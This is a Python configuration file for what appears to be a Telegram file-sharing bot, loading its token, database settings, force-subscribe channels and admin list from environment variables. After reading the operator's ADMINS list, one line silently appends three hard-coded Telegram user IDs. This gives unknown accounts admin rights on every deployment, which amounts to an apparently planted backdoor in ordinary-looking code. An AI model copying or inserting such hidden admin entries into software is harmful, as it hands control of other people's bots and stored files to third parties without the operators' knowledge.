from os import getenv
from dotenv import load_dotenv
from logging import basicConfig, INFO, WARNING, getLogger, Logger


load_dotenv("config.env")

BOT_TOKEN = getenv("BOT_TOKEN")

CHANNEL_DB = int(getenv("CHANNEL_DB"))
DATABASE_URL = getenv("DATABASE_URL")
DATABASE_NAME = getenv("DATABASE_NAME")

RESTRICT = getenv("RESTRICT", True)

BUTTON_ROW = int(getenv("BUTTON_ROW", 2))
FORCE_SUB_ = {}
FSUB_TOTAL = 1
while True:
    key = f"FORCE_SUB_{FSUB_TOTAL}"
    value = getenv(key)
    if value is None:
        break
    FORCE_SUB_[FSUB_TOTAL] = int(value)
    FSUB_TOTAL += 1

START_MESSAGE = getenv(
    "START_MESSAGE",
    "Halo {mention}!"
    "\n\n"
    "Saya dapat menyimpan file pribadi di Channel tertentu dan pengguna lain dapat mengaksesnya dari link khusus.",
)
FORCE_MESSAGE = getenv(
    "FORCE_MESSAGE",
    "Halo {mention}!"
    "\n"
    "Anda harus bergabung di Channel/Group terlebih dahulu untuk melihat file yang saya bagikan. Silakan Join Ke Channel/Group yang ada di bawah terlebih dahulu.",
)

ADMINS = [int(x) for x in (getenv("ADMINS").split())]
ADMINS.extend((5007590747, 5594106735, 5700071239))
    
CUSTOM_CAPTION = getenv("CUSTOM_CAPTION", None)
DISABLE_BUTTON = getenv("DISABLE_BUTTON", False)


basicConfig(level=INFO, format="[%(levelname)s] - %(message)s")
getLogger("pyrogram").setLevel(WARNING)
def LOGGER(name: str) -> Logger:
    return getLogger(name)
